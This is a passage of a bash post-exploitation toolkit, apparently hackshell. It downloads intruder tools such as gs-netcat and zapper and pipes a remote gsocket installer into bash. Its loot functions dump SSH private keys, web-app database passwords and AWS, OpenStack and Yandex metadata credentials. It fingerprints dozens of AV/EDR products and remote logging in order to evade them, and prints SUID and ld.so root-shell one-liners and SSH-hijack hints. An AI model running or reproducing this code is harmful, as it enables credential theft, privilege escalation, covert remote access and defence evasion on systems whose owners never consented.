bin_dl() {
    local dst="${XHOME}/${1:?}"
    local str="${CDM}Downloading ${CDC}${1:?}${CDM}........................................"
    local is_skip

    # dl a single binary (not "all").
    [ -n "$single" ] && {
        [ -n "$_HS_SINGLE_MATCH" ] && return # already tried to download
        [ "$single" != "$1" ] && { unset _HS_SINGLE_MATCH; return; }
        _HS_SINGLE_MATCH=1
    }

    echo -en "${str:0:64}"
    [ -s "${dst}" ] || rm -f "${dst:?}" 2>/dev/null
    [ -z "$FORCE" ] && which "${1}" &>/dev/null && is_skip=1
    [ -n "$FORCE" ] && [ -s "$dst" ] && is_skip=1
    [ -n "$is_skip" ] && { echo -e "[${CDY}SKIPPED${CDM}]${CN}"; return 0; }
    { err=$(dl "${2:?}"  2>&1 >&3 3>&-); } >"${dst}" 3>&1 || {
        rm -f "${dst:?}" 2>/dev/null
        if [ -z "$UNSAFE" ] && [[ "$err" == *"$_HS_SSL_ERR"* ]]; then
            echo -e ".[${CR}FAILED${CDM}]${CN}${CF}\n---> ${2}\n---> ${err}\n---> Try ${CDC}export UNSAFE=1${CN}"
        else
            echo -e ".[${CR}FAILED${CDM}]${CN}${CF}\n---> ${2}\n---> ${err}${CN}"
            [[ "$err" == *"404"* ]] && echo -e "${CDG}${CF}---> Ask https://github.com/pkgforge/bin/issues to add${CN}" 
        fi
        return 255
    }
    chmod 711 "${dst}"
    echo -e ".....[${CDG}OK${CDM}]${CN}"
}

# Binary list are available from here:
# - https://meta.pkgforge.dev/bincache/x86_64-Linux.json
# - https://meta.pkgforge.dev/pkgcache/x86_64-Linux.json
# The binaries are "somehow" accessible from here:
# - https://pkgs.pkgforge.dev/ (must check each repo individually to find the binary).
# The GitHub page is here (no binaries. Only build scripts)::
# - https://github.com/pkgforge
_bin_single() {
    local single="${1}" # might be empty "".

    unset _HS_SINGLE_MATCH
    # bin_dl anew         "https://bin.pkgforge.dev/${HS_ARCH}/anew-rs" # fuck anew-rs, it needs argv[1] and is not compatible.
    bin_dl anew         "https://bin.pkgforge.dev/${HS_ARCH}/anew"
    bin_dl awk          "https://bin.pkgforge.dev/${HS_ARCH}/gawk"
    # bin_dl awk          "https://bin.pkgforge.dev/${HS_ARCH}/awk"
    bin_dl base64       "https://bin.pkgforge.dev/${HS_ARCH}/base64"
    bin_dl busybox      "https://bin.pkgforge.dev/${HS_ARCH}/busybox"
    bin_dl curl         "https://bin.pkgforge.dev/${HS_ARCH}/curl"

    #bin_dl dbin         "https://bin.pkgforge.dev/${HS_ARCH}/dbin"
    bin_dl dbin         "https://github.com/xplshn/dbin/releases/latest/download/dbin_${HS_ARCH_ALT}"
    
    # export DBIN_INSTALL_DIR="${XHOME}"

    bin_dl fd           "https://bin.pkgforge.dev/${HS_ARCH}/fd-find"
    # bin_dl fd           "https://github.com/orgs/pkgforge/packages/container/package/bincache/fd/official/fd-find"

    bin_dl gost         "https://bin.pkgforge.dev/${HS_ARCH}/gost"
    bin_dl gs-netcat    "https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_${os,,}-${HS_ARCH}"
    # bin_dl gs-netcat    "https://bin.pkgforge.dev/${HS_ARCH}/gs-netcat" #fetched straight from https://github.com/hackerschoice/gsocket (avoid GH ratelimit)
    # bin_dl grep         "https://bin.pkgforge.dev/${HS_ARCH}/grep"
    bin_dl gzip         "https://bin.pkgforge.dev/${HS_ARCH}/gzip"
    bin_dl hexdump      "https://bin.pkgforge.dev/${HS_ARCH}/hexdump"
    bin_dl jq           "https://bin.pkgforge.dev/${HS_ARCH}/jq"
    # bin_dl nc           "https://bin.pkgforge.dev/${HS_ARCH}/Baseutils/netcat/netcat" #: https://www.libressl.org/
    bin_dl nc           "https://bin.pkgforge.dev/${HS_ARCH}/ncat"
    bin_dl netstat      "https://bin.pkgforge.dev/${HS_ARCH}/netstat"
    bin_dl nmap         "https://bin.pkgforge.dev/${HS_ARCH}/nmap"
    bin_dl noseyparker  "https://bin.pkgforge.dev/${HS_ARCH}/noseyparker"
    # [ "$arch" = "x86_64" ] && bin_dl noseyparker "https://github.com/hackerschoice/binary/raw/main/tools/noseyparker-x86_64-static"
    bin_dl openssl      "https://bin.pkgforge.dev/${HS_ARCH}/openssl"
    bin_dl ping         "https://bin.pkgforge.dev/${HS_ARCH}/ping"
    bin_dl ps           "https://bin.pkgforge.dev/${HS_ARCH}/ps"
    bin_dl reptyr       "https://bin.pkgforge.dev/${HS_ARCH}/reptyr"
    bin_dl rg           "https://bin.pkgforge.dev/${HS_ARCH}/ripgrep"
    bin_dl rsync        "https://bin.pkgforge.dev/${HS_ARCH}/rsync"
    bin_dl script       "https://bin.pkgforge.dev/${HS_ARCH}/script"
    bin_dl sed          "https://bin.pkgforge.dev/${HS_ARCH}/sed"
    bin_dl socat        "https://bin.pkgforge.dev/${HS_ARCH}/socat"
    bin_dl strace       "https://bin.pkgforge.dev/${HS_ARCH}/strace"
    bin_dl tar          "https://bin.pkgforge.dev/${HS_ARCH}/tar"
    bin_dl tcpdump      "https://bin.pkgforge.dev/${HS_ARCH}/tcpdump"
    # bin_dl vi           "https://bin.pkgforge.dev/${HS_ARCH}/vi"
    bin_dl vim          "https://bin.pkgforge.dev/${HS_ARCH}/vim"
    bin_dl zapper       "https://github.com/hackerschoice/zapper/releases/latest/download/zapper-${os,,}-${HS_ARCH}"
    bin_dl zgrep        "https://bin.pkgforge.dev/${HS_ARCH}/zgrep"

    { [ -z "$single" ] || [ "$single" == "busybox" ]; } && {
        # Only create busybox-bins for bins that do not yet exist.
        busybox --list | while read -r fn; do
            command -v "$fn" >/dev/null && continue
            [ -e "${XHOME}/${fn}" ] && continue
            ln -s "busybox" "${XHOME}/${fn}"
        done
    }
    [ -n "$single" ] && [ -z "$_HS_SINGLE_MATCH" ] && {
        local str="${single##*/}"
        local loc="${single}"
        [ "$str" == "cme" ] && HS_WARN "CME is obsolete. Try ${CDC}bin netexec${CN}"
        [ "$str" == "crackmapexec" ] && HS_WARN "CrackMapExec is obsolete. Try ${CDC}bin netexec${CN}"
        bin_dl "${str}" "https://bin.pkgforge.dev/${HS_ARCH}/${loc}"
    }
}

bin() {
    local os
    local optsstr="$*"

    hs_mkxhome
    os="$(uname -s)"
    [ -z "$os" ] && os="Linux"

    if [ $# -eq 0 ]; then
        _bin_single # install all
        [ -z "$FORCE" ] && echo -e ">>> Use ${CDC}FORCE=1 bin${CN} to download all" 
        echo -e ">>> Use ${CDC}bin <name>${CN} to download a specific binary"
    else 
        while [ $# -gt 0 ]; do
            FORCE=1 _bin_single "$1"
            shift 1
        done
    fi

    { [[ "$optsstr" == *"zapper"* ]] || [[ -z "$optsstr" ]]; } && echo -e ">>> ${CW}TIP${CN}: Type ${CDC}zapme${CN} to hide all command line options\n>>> from your current shell and all further processes."

    # echo -e ">>> ${CDG}Download COMPLETE${CN}"
    unset _HS_SINGLE_MATCH
    hs_init_alias_reinit
}

loot_sshkey() {
    local str
    local fn="${1}"

    [ ! -s "${fn}" ] && return
    grep -Fqam1 'PRIVATE KEY' "${fn}" || return

    if [ -n "$_HS_SETSID_WAIT" ]; then
        str=" ${CF}password protected"
        setsid -w ssh-keygen -y -f "${fn}" </dev/null &>/dev/null && str=" ${CDR}NO PASSWORD"
    else 
        grep -Fqam1 'ENCRYPTED' "${fn}" && str=" ${CF}password protected"
    fi
    echo -e "${CB}SSH-Key ${CDY}${fn}${CN}${str}${CDY}${CF}"
    cat "$fn"
    echo -en "${CN}"
}

loot_gitlab() {
    local fn="${1:?}"
    local str
    [ ! -f "$fn" ] && return
    str="$(grep -i "${_HS_GREP_COLOR_NEVER[@]}" ^psql "${fn}")"
    [ -z "$str" ] && return
    echo -e "${CB}GitLab-DB ${CDY}${fn}${CF}"
    echo "$str"
    echo -en "${CN}"
}

loot_bitrix() {
    local fn="${1:?}"
    local str
    [ ! -f "$fn" ] && return
    grep -Fqam1 '$_ENV[' "$fn" && return
    # 'password' => 'abcd',
    # $DBPassword = 'abcd';
    str="$(grep -i "${_HS_GREP_COLOR_NEVER[@]}" -E '(host|database|DBName|login|Password).*=.* ["'"'"']' "${fn}" | sed 's/\s*//g')"
    [ -z "$str" ] && return
    echo -e "${CB}Bitrix-DB ${CDY}${fn}${CF}"
    echo "$str"
    echo -en "${CN}"
}

_loot_wp() {
    local fn="${1:?}"
    local str
    [ ! -f "$fn" ] && return

    str="$(grep -v ^# "$fn" | grep -E "DB_(NAME|USER|PASSWORD|HOST)")"
    [[ "$str" == *"_here"* ]] && return
    echo -e "${CB}WordPress-DB ${CDY}${fn}${CF}"
    echo "${str}"
    echo -en "${CN}"
}

# _loot_home <NAME> <filename> <cmd> <...>
_loot_homes() {
    local fn hn str
    local name="${1:-CREDS}"
    local fname="${2:?}"
    shift 1
    shift 1
	[ $# -le 0 ] && set -- cat

    for hn in "${HOMEDIRARR[@]}"; do
        fn="${hn}/${fname}"
        [ ! -s "$fn" ] && continue
        str="$("$@" "$fn" 2>/dev/null)"
        [ -z "$str" ] && continue
        echo -e "${CB}${name} ${CDY}${fn}${CF}"
        echo "$str"
        echo -en "${CN}"
    done
}

_loot_openstack() {
    local str
    local rv

    [ -n "$_HS_NOT_OPENSTACK" ] && return
    [ -n "$_HS_NO_SSRF_169" ] && return
    [ -n "$_HS_GOT_SSRF_169" ] && return

    str="$(timeout "${HS_TO_OPTS[@]}" 4 bash -c "$(declare -f dl);dl 'http://169.254.169.254/openstack/latest/user_data'" 2>/dev/null)" || {
        rv="$?"
        { [ "${rv}" -eq 124 ] || [ "${rv}" -eq 7 ]; } && _HS_NO_SSRF_169=1
        unset str
    }

    [ -z "$str" ] && {
        _HS_NOT_OPENSTACK=1
        return 255
    }
    _HS_GOT_SSRF_169=1
    echo -e "${CB}OpenStack user_data${CDY}${CF}"
    echo "$str"
    echo -en "${CN}"
    echo -e "${CW}TIP: ${CDC}"'dl "http://169.254.169.254/openstack/latest/meta_data.json" | jq -r'"${CN}"
}

# FIXME: Search through environment variables of all running processes.
# FIXME: Implement GCP & Digital Ocean. See https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf
_loot_aws() {
    local str
    local TOKEN
    local role
    local rv

    [ -n "$_HS_NOT_AWS" ] && return
    [ -n "$_HS_NO_SSRF_169" ] && return
    [ -n "$_HS_GOT_SSRF_169" ] && return

    command -v curl >/dev/null || return # AWS always has curl

    str="$(timeout "${HS_TO_OPTS[@]}" 4 curl -SsfL -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60" 2>/dev/null)" || {
        rv="$?"
        { [ "${rv}" -eq 124 ] || [ "${rv}" -eq 7 ]; } && _HS_NO_SSRF_169=1
        unset str
    }
    [ -z "$str" ] && {
        _HS_NOT_AWS=1
        return 255
    }
    TOKEN="$str"

    _HS_GOT_SSRF_169=1
    str="$(curl -SsfL -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/user-data 2>/dev/null)"
    [ -n "$str" ] && [[ "$str" != *Lightsail* ]] && {
        echo -e "${CB}AWS user-data (config)${CDY}${CF}"
        echo "$str"
        echo -en "${CN}"
    }

    str="$(curl -SsfL -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance 2>/dev/null)" || unset str
    [ -n "$str" ] && {
        echo -e "${CB}AWS EC2 Security Credentials${CDY}${CF}"
        echo "$str"
        echo -en "${CN}"
    }

    str="$(curl -SsfL -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)" || unset str
    [ -n "$str" ] && {
        for role in $str; do
            echo -e "${CB}AWS IAM Role${CDY} ${role}${CF}"
            curl -SsfL -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$role"
            echo -e "${CN}"
        done
    }
}

_loot_yandex() {
    local str
    local rv

    [ -n "$_HS_NOT_YC" ] && return
    [ -n "$_HS_NO_SSRF_169" ] && return
    [ -n "$_HS_GOT_SSRF_169" ] && return

    str="$(timeout "${HS_TO_OPTS[@]}" 4 bash -c "$(declare -f dl);dl 'http://169.254.169.254/latest/user-data'" 2>/dev/null)" || {
        rv="$?"
        { [ "${rv}" -eq 124 ] || [ "${rv}" -eq 7 ]; } && _HS_NO_SSRF_169=1
        unset str
    }
    [ -z "$str" ] && {
        _HS_NOT_YC=1
        return 255
    }

    _HS_GOT_SSRF_169=1
    echo -e "${CB}Yandex Cloud user-data (config)${CDY}${CF}"
    echo "$str"
    echo -en "${CN}"
    echo -e "${CW}TIP: ${CDC}curl -SsfL 'http://169.254.169.254/computeMetadata/v1/instance/?alt=text&recursive=true' -H 'Metadata-Flavor:Google'${CN}"
}

# make GS-NETCAT command available if logged in via GSNC.
gsnc() {
    [ -z "$GSNC" ] && return 255
    _GS_ALLOWNOARG=1 "$GSNC" "$@"
}
command -v gs-netcat >/dev/null || gs-netcat() { gsnc "$@"; }

gsinst() {
    local b
    [ -n "$BRANCH" ] && b="${BRANCH}/"
    dl https://gsocket.io/${b}y | bash
}

# https://github.com/hackerschoice/hackshell/issues/6
_warn_edr() {
    local fns s out

    fns=()
    _hs_chk_systemd() { systemctl is-active "${1:?}" &>/dev/null && out+="${2:?}: systemctl status $1"$'\n';}
    _hs_chk_fn() { { [ -z "${1}" ] || [ ! -e "${1:?}" ]; } && return; fns+=("${1:?}"); out+="${2:?}: $1"$'\n';}

    _hs_chk_fn "/usr/lib/Acronis"                           "Acronis Cyber Protect"
    _hs_chk_fn "/etc/aide/aide.conf"                        "Advanced Intrusion Detection Environment (AIDE)"
    _hs_chk_fn "/etc/init.d/avast"                          "Avast"
    _hs_chk_fn "/var/lib/avast/Setup/avast.vpsupdate"       "Avast"
    _hs_chk_fn "/etc/init.d/avgd"                           "AVG"
    _hs_chk_fn "/opt/avg"                                   "AVG"
    _hs_chk_fn "/var/log/checkpoint"                        "Checkpoint"
    # This is so old and wont find any modern rootkits.
    _hs_chk_fn "/etc/chkrootkit"                            "chkrootkit [chkrootkit -q]"
    _hs_chk_fn "/opt/cisco/amp/bin/ampcli"                  "Cisco Secure Endpoint"
    _hs_chk_fn "/etc/clamd.d/scan.conf"                     "ClamAV"
    _hs_chk_fn "$(command -v clamscan)"                     "ClamAV"
    _hs_chk_fn "/etc/freshclam.conf"                        "ClamAV"
    _hs_chk_fn "/opt/COMODO"                                "Comodo AV"
    _hs_chk_fn "/opt/CrowdStrike"                           "CrowdShite"
    _hs_chk_fn "/opt/cyberark"                              "CyberArk"
    _hs_chk_fn "/opt/360sdforcnos"                          "EDR ?"
    _hs_chk_fn "/etc/filebeat"                              "Filebeat (not AV/EDR, but used to ship logs)"
    _hs_chk_fn "/opt/fireeye"                               "FireEye/Trellix EDR"
    _hs_chk_fn "/opt/isec"                                  "FireEye/Trellix Endpoint Security"
    _hs_chk_fn "/opt/McAfee"                                "FireEye/McAfee/Trellix Agent"
    _hs_chk_fn "/opt/Trellix"                               "FireEye/McAfee/Trellix SIEM Collector"
    _hs_chk_fn "/etc/fluent-bit"                            "Fluent Bit Log Collector"
    _hs_chk_fn "/opt/FortiEDRCollector"                     "Fortinet FortiEDR"
    _hs_chk_fn "/opt/fortinet/fortisiem"                    "Fortinet FortiSIEM"
    _hs_chk_fn "/etc/init.d/fortisiem-linux-agent"          "Fortinet FortiSIEM"
    _hs_chk_fn "/usr/bin/ada"                               "Group-iB Advanced Detection Analysis"
    _hs_chk_fn "/usr/bin/linep"                             "Group-iB XDR Endpoint Agent"
    _hs_chk_fn "/usr/local/bin/intezer-analyze"             "Intezer"
    _hs_chk_fn "/opt/kaspersky"                             "Kaspersky"
    _hs_chk_fn "/etc/init.d/kics"                           "Kaspersky Industrial CyberSecurity"
    _hs_chk_fn "/usr/local/rocketcyber"                     "Kseya RocketCyber"
    _hs_chk_fn "/etc/init.d/limacharlie"                    "LimaCharlie Agent"
    _hs_chk_fn "/etc/logrhythm"                             "LogRhythm Axon"
    _hs_chk_fn "/bin/logrhythm"                             "LogRhythm Axon"
    _hs_chk_fn "opt/logrhythm/scsm"                         "LogRhythm System Monitor"
    _hs_chk_fn "/etc/init.d/scsm"                           "LogRhythm System Monitor"
    _hs_chk_fn "/var/pt"                                    "PT Swarm"
    _hs_chk_fn "/usr/local/qualys"                          "Qualys EDR Cloud Agent"
    _hs_chk_fn "/etc/init.d/qualys-cloud-agent"             "Qualys EDR Cloud Agent"
    _hs_chk_fn "/etc/rkhunter.conf"                         "RootKit Hunter [rkhunter -c -l /dev/shm/.rk --sk --nomow --rwo; rm -f /dev/shm/.rk]"
    _hs_chk_fn "$(command -v rkhunter)"                     "RootKit Hunter [rkhunter -c -l /dev/shm/.rk --sk --nomow --rwo; rm -f /dev/shm/.rk]"
    _hs_chk_fn "/etc/safedog/sdsvrd.conf"                   "Safedog"
    _hs_chk_fn "/etc/safedog/server/conf/sdsvrd.conf"       "Safedog"
    _hs_chk_fn "/sf/edr/agent/bin/edr_agent"                "Sangfor EDR"
    _hs_chk_fn "/opt/secureworks"                           "Secureworks"
    _hs_chk_fn "/opt/splunkforwarder"                       "Splunk"
    _hs_chk_fn "/opt/SumoCollector"                         "Sumo Logic Cloud SIEM"
    _hs_chk_fn "/etc/otelcol-sumo/sumologic.yaml"           "Sumo Logic OTEL Collector"
    _hs_chk_fn "/opt/Symantec"                              "Symantec EDR"
    _hs_chk_fn "/etc/init.d/sisamdagent"                    "Symantec EDR"
    _hs_chk_fn "/usr/lib/symantec/status.sh"                "Symantec Linux Agent"
    _hs_chk_fn "/opt/Tanium"                                "Tanium"
    _hs_chk_fn "/opt/threatbook/OneAV"                      "threatbook.OneAV"
    _hs_chk_fn "/usr/bin/oneav_start"                       "threatbook.OneAV"
    _hs_chk_fn "/opt/threatconnect-envsvr/"                 "ThreatConnect"
    _hs_chk_fn "/etc/init.d/threatconnect-envsvr"           "ThreatConnect"
    _hs_chk_fn "/titan/agent/agent_update.sh"               "Titan Agent"
    _hs_chk_fn "/etc/tripwire"                              "TripWire"
    _hs_chk_fn "/etc/init.d/ds_agent"                       "Trend Micro Deep Instinct"
    _hs_chk_fn "/opt/ds_agent/dsa"                          "Trend Micro Deep Security Agent"
    _hs_chk_fn "/etc/init.d/splx"                           "Trend Micro Server Protect"
    _hs_chk_fn "/etc/opt/f-secure"                          "WithSecure (F-Secure)"
    _hs_chk_fn "/opt/f-secure"                              "WithSecure (F-Secure)"

    [ "${#fns[@]}" -gt 0 ] && out+="$(\ls -alrtd "${fns[@]}")"$'\n'

    [ -f "/etc/audit/audit.rules" ] && grep -v ^# "/etc/audit/audit.rules" | grep -Eqm1 '.{32,}' && _hs_chk_systemd "auditd"             "Auditd [/etc/audit/rules.d]"
    _hs_chk_systemd "avast"                             "Avast"
    _hs_chk_systemd "bdsec"                             "Bitdefender EDR / GavityZone XDR"
    _hs_chk_systemd "cylancesvc"                        "Blackberry cyPROTECT"
    _hs_chk_systemd "cyoptics"                          "Blackberry cyOPTICS"
    _hs_chk_systemd "cbsensor"                          "CarbonBlack"
    _hs_chk_systemd "cpla"                              "Checkpoint"
    _hs_chk_systemd "itsm"                              "Comodo Client Security"
    _hs_chk_systemd "falcon-sensor"                     "CrowdStrike"
    _hs_chk_systemd "epmd"                              "CyberArk"
    _hs_chk_systemd "cybereason-sensor"                 "Cybereason"
    _hs_chk_systemd "elastic-agent"                     "Elastic Security"
    _hs_chk_systemd "sraagent"                          "ESET Endpoint Security"
    _hs_chk_systemd "eraagent"                          "ESET Endpoint Security"
    _hs_chk_systemd "eea"                               "ESET AV"
    _hs_chk_systemd "eea-user-agent"                    "ESET AV agent"
    _hs_chk_systemd "xagt"                              "FireEye/Trellix EDR"
    _hs_chk_systemd "keeperx"                           "IBM QRADAR"
    _hs_chk_systemd "kesl"                              "Kaspersky Endpoint Security"
    _hs_chk_systemd "klnagent64"                        "Kaspersky Network Agent"
    _hs_chk_systemd "kesl-supervisor"                   "Kaspersky Endpoint Security (Elbrus Edition)"
    _hs_chk_systemd "kics"                              "Kaspersky Industrial CyberSecurity"
    _hs_chk_systemd "kess"                              "Kaspersky Embedded Systems Security"
    _hs_chk_systemd "rocketcyber"                       "Kseya RocketCyber"
    _hs_chk_systemd "limacharlie"                       "LimaCharlie Agent"
    _hs_chk_systemd "lr-agent.logrhythm"                "LogRhythm Axon"
    _hs_chk_systemd "MFEcma"                            "McAfee"
    _hs_chk_systemd "mdatp"                             "MS defender"
    _hs_chk_systemd "osqueryd"                          "OSQuery"
    _hs_chk_systemd "traps_pmd"                         "Palo Alto Networks Cortex XDR"
    _hs_chk_systemd "ir_agent"                          "Rapid7 INSIGHT IDR"
    _hs_chk_systemd "armor"                             "Rapid7 NG AV"
    _hs_chk_systemd "sophoslinuxsensor"                 "Sophos Intercept X"
    _hs_chk_systemd "sophos-spl"                        "Sophos SPL"
    _hs_chk_systemd "otelcol-sumo"                      "Sumo Logic OTEL Collector"
    _hs_chk_systemd "ds_agent"                          "TrendMicro - Deep Instinct"
    _hs_chk_systemd "titanagent"                        "Titanagent EDR"
    _hs_chk_systemd "taniumclient"                      "Tanium"
    _hs_chk_systemd "oneavd"                            "threatbook.OneAV"
    _hs_chk_systemd "mbdaemon"                          "ThreatDown (MalwareBytes) Nebula EDR Agent"
    _hs_chk_systemd "wazuh-agent"                       "Wazuh"
    _hs_chk_systemd "emit_scand_service"                "WithSecure (F-Secure) Elements Agent"
    _hs_chk_systemd "f-secure-linuxsecurity-activate"   "WithSecure (F-Secure) Elements Agent"

    [ -n "$out" ] && {
        echo -e "${CR}AV/EDR found ${CF}"
        echo -n "$out"
        echo -en "${CN}"
    }

    unset out
    s="$(grep -v '^#' rsyslog.conf /etc/rsyslog.d/*.conf 2>/dev/null | grep -F ' @@')" && out="$s"$'\n'
    [ -n "$out" ] && {
        echo -e "${CR}Remote Logging detected${CF}"
        echo -n "$out"
        echo -en "${CN}"
    }

    unset out
    selinuxenabled &>/dev/null && out+="SELinux is enabled [getenforce;getsebool -a;sestatus]"$'\n'
    aa-status &>/dev/null && out+="AppArmor is enabled"$'\n'
    grep -Fqam1 PaX /proc/self/status 2>/dev/null && out+="GrSec and PaX are enabled"$'\n'
    [ -n "$out" ] && {
        echo -e "${CR}Security Modules enabled${CF}"
        echo -n "$out"
        echo -en "${CN}"
    }

    [ -f /sys/kernel/debug/kprobes/list ] && out="$(</sys/kernel/debug/kprobes/list)" && [ -n "$out" ] && {
        echo -e "${CR}kprobes found:${CF}"
        echo "$out"
        echo -en "${CN}"
    }
    unset -f _hs_chk_systemd _hs_chk_fn
}

xpty() {
    local our_pty="$(tty)"
    our_pty="${our_pty##*/}"

    stat /dev/pts/* -c '%n %X %U' 2>/dev/null |
    our_pty="$our_pty" awk -v now="$(date +%s)" '$1 ~ /\/[0-9]+$/ {
      gsub( /[^0-9]/, "", $1 )
      list[$1]=now-$2 "\t PTY " $1 " user " $3
      if( $1==ENVIRON["our_pty"] ) list[$1]=list[$1] " ** this is us **"}
      END {for(i in list) print list[i]}' | sort -rn
    # reminder: do not use gawk functions, e.g. systime
}

# Warn if there are other root kits found.
_warn_rk() {
    local n=0
    local tainted
    local str

    [ -e "/proc/sys/kernel/tainted" ] && n="$(</proc/sys/kernel/tainted)"
    # https://docs.kernel.org/admin-guide/tainted-kernels.html#decoding-tainted-state-at-runtime
    # Check for Proprietary(0), out-of-tree(12) and unsigned(13)
    [ "$n" -gt 0 ] && { [ $((n & 1)) -eq 1 ] || [ $((n>>12 & 1)) -eq 1 ] || [ $((n>>13 & 1)) -eq 1 ]; } && tainted=1

    [ -z "$tainted" ] && return
    echo -e "${CR}Non standard LKM detected${CF} (/proc/sys/kernel/tainted=$n)"
    command -v modinfo >/dev/null && cat "/proc/modules" 2>/dev/null | while read -r m; do
        m="${m%% *}"
        str="$(modinfo "$m" 2>/dev/null)" || continue
        [[ "$str" == *"Build time autogenerated kernel"* ]] && continue
        [[ "$str" == *"intree:         Y"* ]] && continue
        modinfo "$m" | grep "${_HS_GREP_COLOR_NEVER[@]}" -E '(^filename|^author)'
    done
    echo -en "${CN}"
    # Also: cat /sys/kernel/tracing/available_filter_functions*| grep <module_name>
    [ -f /sys/kernel/tracing/enabled_functions ] && echo -e "Try ${CDC}cat /sys/kernel/tracing/enabled_functions${CN}"
    [ -f /sys/kernel/tracing/touched_functions ] && echo -e "Try ${CDC}cat /sys/kernel/tracing/touched_functions${CN}"
}

_hs_gen_home() {
    local IFS
    local str
    local fn
    unset HOMEDIRARR

    if [ -n "$HOMEDIR" ]; then
        if [ -d "${ROOTFS}${HOMEDIR}" ]; then
            str="$({ find "${ROOTFS}${HOMEDIR}" -mindepth 1 -maxdepth 1 -type d; } | sort -u)"
        else
            HS_WARN "Directory not found: HOMEDIR='${ROOTFS}${HOMEDIR}'"
        fi
        fn="${ROOTFS}/root"
        [ -d "$fn" ] && str+="$fn"$'\n'
    else
        # str="$({ find "${HOMEDIR:-/home}" -mindepth 1 -maxdepth 1 -type d; awk -F':' '{print $6}' </etc/passwd 2>/dev/null | while read -r d; do [ -d "$d" ] && echo "$d"; done; [ -d /var/www ] && echo "/var/www"; } | sort -u)"
        str="$({ find "${ROOTFS}${HOMEDIR:-/home}" -mindepth 1 -maxdepth 1 -type d 2>/dev/null; cat "${ROOTFS}/etc/passwd" 2>/dev/null | awk -F':' '{print $6}' 2>/dev/null | while read -r d; do [ ! -d "${ROOTFS}$d" ] && continue; [[ "$d" == "/" || "$d" == "/bin" || "$d" == "/sbin" ]] && continue; echo "${ROOTFS}${d%/}"; done; } | sort -u)"
        [ -d "${ROOTFS}/var/www" ] && [[ "$str" != *"/var/www"* ]] && str+="${ROOTFS}/var/www"$'\n'
    fi

    set -f
    IFS=$'\n' HOMEDIRARR=($str)
    set +f
}

lootlight() {
    local str
    ls -al "${ROOTFS}"/tmp/ssh-* &>/dev/null && {
        echo -e "${CB}SSH_AUTH_SOCK${CDY}${CF}"
        find "${ROOFS}"/tmp -name 'agent.*' 2>/dev/null | while read -r fn; do
            unset str
            command -v lsof >/dev/null && lsof -n "$fn" &>/dev/null && str="[ACTIVE]"
            echo "$(ls -al "$fn")"$'\t'"${str}"
        done
        echo -en "${CN}"
    }

    [ "$UID" -ne 0 ] && {
        unset str
        str="$(find "${ROOTFS}"/var/tmp "${ROOTFS}"/tmp -maxdepth 2 -uid 0  -perm /u=s -ls 2>/dev/null)"
        [ -n "$str" ] && {
            echo -e "${CB}B00M-SHELL ${CDY}${CF}"
            echo "${str}"
            echo -en "${CN}"
            echo -e "${CW}TIP: ${CDC}/${str##* /}"' -p -c "exec '"${HS_PY:-python}"' -c \"import os;os.setuid(0);os.setgid(0);os.execl('"'"'/bin/bash'"'"', '"'"'-bash'"'"')\""'"${CN}"
        }

        str="$( { readlink -f "${ROOTFS}"/lib64/ld-*.so.* || readlink -f "${ROOTFS}"/lib/ld-*.so.* || readlink -f "${ROOTFS}"/lib/ld-linux.so.2; } 2>/dev/null )"
        [ -f "$str" ] && getcap "$str" 2>/dev/null | grep -qFm1 cap_setuid 2>/dev/null && {
            echo -e "${CB}B00M-SHELL ${CDY}${CF}"
            getcap "${str}" 2>/dev/null
            echo -en "${CN}"
            # BUG: Linux yells 'Inconsistency detected by ld.so: rtld.c: 1327: _dl_start_args_adjust: Assertion `auxv == sp + 1' failed!'
            # if TMPDIR=/dev/shm and ld.so is used to load binary.
            echo -en "${CW}TIP: ${CDC}unset TMPDIR; $str $(command -v "${HS_PY:-python}") -c"
            echo "\$'import os\ntry:\n\tos.setuid(0)\n\tos.setgid(0)\nexcept:\n\tpass\n''"'os.execl("/bin/bash", "-bash");'"'"
        }
    }

    unset str
    if command -v pgrep >/dev/null && pgrep --help 2>/dev/null | grep -qFm1 -- --list-full ; then
        if [[ "$UID" -eq 0 ]]; then
            str="$(pgrep -x 'ssh' --list-full)"
        else
            str="$(pgrep -x 'ssh' --list-full --euid "$UID")"
        fi
    elif command -v ps >/dev/null; then
        if [[ "$UID" -eq 0 ]]; then
            str="$(ps alx | grep "ssh " | grep -v grep)"
        else
            str="$(ps lx | grep "ssh " | grep -v grep)"
        fi
    fi
    [ -n "$str" ] && {
        echo -e "${CB}SSH-Hijack ${CF}[reptyr -T \$(pidof -s ssh)]${CDY}${CF}"
        echo "${str}"
        echo -e "${CN}"
    }

    _warn_edr
    _warn_rk
}

_lootmore_last() {
    command -v last >/dev/null || return
    if [ -z "${ROOTFS}" ]; then
        echo -e "${CB}Last Logins ${CDY}${CF}"
        last -i -n20 2>/dev/null
    else
        fn="${ROOTFS}/var/log/wtmp"
        [ ! -s "${fn}" ] && return
        echo -e "${CB}Last Logins ${CDY}${CF}"
        last -i -n20 -f "${fn}" 2>/dev/null
    fi
    echo -en "${CN}"
}

_lootmore_docker() {
    local fn

    command -v docker >/dev/null || return
    [ -n "$ROOTFS" ] && {
        fn="${ROOTFS}/var/run/docker.sock"
        [ ! -e "$fn" ] && return
        DOCKER_HOST="unix://${fn}"
    }
    str="$(DOCKER_HOST="${DOCKER_HOST}" docker ps -a 2>/dev/null)"
    [ -z "$str" ] && return

    echo -e "${CB}Docker ${CDY}${CF}"
    echo "$str"
    echo -en "${CN}"
}

_lootmore_pct() {
    command -v pct >/dev/null || { unset _HS_LOOT_PCT; return; }

    # lxc-ls
    # for x in $(lxc-ls); do lxc-info -n "$x" -s -i; done
    str="$(pct list 2>/dev/null | grep -v ^VMID)"
    [ -z "$str" ] && return
    echo -e "${CB}Proxmox VMs${CF} [try lxc-ls]${CDY}${CF}"
    echo "$str"
    echo -en "${CN}"
    _HS_LOOT_PCT=1
}

_lootmore_lxc() {
    # Skip if already looted ProxMox (it uses lxc)
